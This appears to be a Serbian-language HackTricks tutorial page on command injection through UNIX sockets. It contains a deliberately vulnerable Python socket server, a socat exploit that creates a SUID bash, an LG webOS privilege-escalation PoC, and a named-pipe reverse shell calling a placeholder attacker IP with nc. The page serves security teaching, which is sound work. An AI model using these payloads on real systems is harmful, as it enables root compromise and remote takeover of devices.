# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Primer vezivanja socket-a sa Python-om

U sledećem primeru se **unix socket kreira** (`/tmp/socket_test.s`), a sve što bude **primljeno** biće **izvršeno** pomoću `os.system`. Znam da ovo nećete pronaći u praksi, ali cilj ovog primera je da vidite kako izgleda kod koji koristi unix socket-e i kako se upravlja unosom u najgorem mogućem slučaju.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Izvršite** kod pomoću python: `python s.py` i **proverite kako socket osluškuje**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Studija slučaja: Eskalacija pokrenuta signalom preko UNIX socket-a u vlasništvu root-a (LG webOS)

Neki privilegovani daemoni izlažu UNIX socket u vlasništvu root-a koji prihvata nepouzdane podatke i povezuje privilegovane radnje sa ID-jevima niti i signalima. Ako protokol omogućava klijentu bez privilegija da utiče na to koja native nit će biti ciljana, možda možete pokrenuti privilegovanu putanju koda i izvršiti eskalaciju.<sup>[[1]](#references)[[2]](#references)</sup>

Primarni write-up i objava opisuju sledeći redosled.<sup>[[1]](#references)[[2]](#references)</sup>

Uočeni obrazac:
- Povežite se na socket u vlasništvu root-a (npr. /tmp/remotelogger).
- Kreirajte nit i pribavite njen native ID niti (TID).
- Pošaljite TID (upakovan) zajedno sa padding-om kao zahtev; primite potvrdu.
- Pošaljite određeni signal tom TID-u da biste pokrenuli privilegovano ponašanje.

Sažeti PoC u nastavku prati taj redosled.<sup>[[1]](#references)[[2]](#references)</sup>
Minimalni nacrt PoC-a:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Da biste ovo pretvorili u root shell, može se koristiti jednostavan named-pipe + nc pattern.<sup>[[2]](#references)</sup>
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
- Ova klasa grešaka nastaje usled verovanja vrednostima izvedenim iz stanja neprivilegovanog klijenta (TID-ovi) i njihovog povezivanja sa privilegovanim signal handlers ili logikom.<sup>[[1]](#references)</sup>
- Ojačajte zaštitu nametanjem credentials na socket-u, validacijom formata poruka i odvajanjem privilegovanih operacija od eksterno prosleđenih identifikatora niti.

## References

- [1] [Jailbreak webOS-a iz zabave (samo iz zabave)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
- [2] [LG WebOS Path Traversal, zaobilaženje autentikacije i potpuno preuzimanje uređaja (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
{{#include ../../banners/hacktricks-training.md}}
